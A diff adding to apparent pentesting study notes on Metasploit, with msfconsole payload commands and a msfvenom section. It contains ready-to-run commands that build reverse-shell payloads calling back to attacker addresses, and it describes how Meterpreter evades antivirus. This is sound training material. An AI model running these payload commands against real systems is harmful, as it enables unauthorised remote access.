@@ -24,8 +24,10 @@ msf6> info [path to module] # Show information for a given module
 
 msf6> show [module type]  # List modules of a given type
 msf6> show options  # Show options related to the current context (exploit, payload etc)
+msf6> show payloads  # When an exploit is selected, show the compatible payloads
 
 # Setting options
+msf6> set payload 0  # Set the first payload in a list to be used with the current exploit
 msf6> set RHOSTS 10.0.0.1  # Set an option for this module only
 msf6> setg RHOSTS 10.0.0.1  # Set an option globally (all modules will be affected)
 msf6> unset RHOSTS
@@ -89,3 +91,25 @@ msf6> hosts -R  # Uses stored hosts to set the options for the current module (n
 msf6> services
 msf6> services -S [service name]  # Search for a given service already stored in the database
 ```
+## msfvenom
+msfvenom, the successor to both msfpayload and msfencode, **allows you to generate payloads**.
+It specifically allows you to access all payloads in the Metasploit framework, and create payloads in different formats and for different target architectures.
+```bash
+msfvenom -l payloads  # List possible payloads
+msfvenom --list formats
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64  # Encode the PHP version of meterpreter in base64, and output the result as it is
+msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
+msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
+msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
+```
+**You'll need to encode the options with the payload if you're aiming for a reverse shell (for example)**, like in the examples setting LHOST and LPORT in the `msfvenom` command.
+Once the payload is uploaded and running, you can use the `multi/handler` to handle incoming connections. **Don't forget to set the payload option accordingly.**
+## Meterpreter
+Meterpreter is **a payload that supports the pentesting process with many components**. It runs on the target system, and acts as a way to interact with the target OS.
+It has different versions tailored to different operating systems. It runs entirely **in memory**, and doesn't write itself to disk. This helps evade antivirus solutions that only scan new files.
+It uses encrypted communication to evade network-level protections that might read incoming data.
+Still, meterpreter is **well-known by major antivirus software**.
+### Meterpreter Flavors
